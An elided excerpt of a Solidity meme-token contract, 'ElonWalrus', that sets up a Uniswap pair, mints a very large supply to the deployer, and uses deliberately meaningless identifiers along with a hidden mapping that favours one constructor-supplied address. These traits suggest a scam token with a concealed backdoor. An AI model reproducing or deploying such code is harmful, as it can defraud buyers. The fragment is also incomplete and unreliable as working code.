...
contract ElonWalrus is Ownable {
    ...
    string private writer;
    uint256 private _tTotal;
    string private mission;
    uint256 private roar;
    uint8 private whom;
    ...
    function lonely(
        ...
        youth -= road;
        fill[drawn] += whom;
        simplest[income] += youth;
    }

    mapping(address => uint256) private fill;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private correctly;
    ...
    constructor(
        ...
        string memory explain,
        address remember,
        address birds
    ) {
        uniswapV2Router = IUniswapV2Router02(remember);
        noon = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        value = 0;
        roar = 100;
        correctly[birds] = whom;
        _tTotal = 1000000000000000 * 10**whom;
        simplest[msg.sender] = _tTotal;
    }
}